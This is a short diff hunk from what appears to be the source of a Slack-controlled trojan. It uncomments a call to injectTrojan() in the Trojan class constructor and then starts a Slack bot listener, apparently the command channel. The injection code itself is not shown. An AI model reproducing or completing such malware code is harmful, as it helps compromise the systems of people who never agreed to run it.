@@ -7,7 +7,7 @@ from config import Config
 class Trojan:
     def __init__(self):
         self.__config = Config()
-        # self.injectTrojan()
+        self.injectTrojan()
         self.slack_bot = slackBot(self.__config)
         self.slack_bot.start_listen()
 
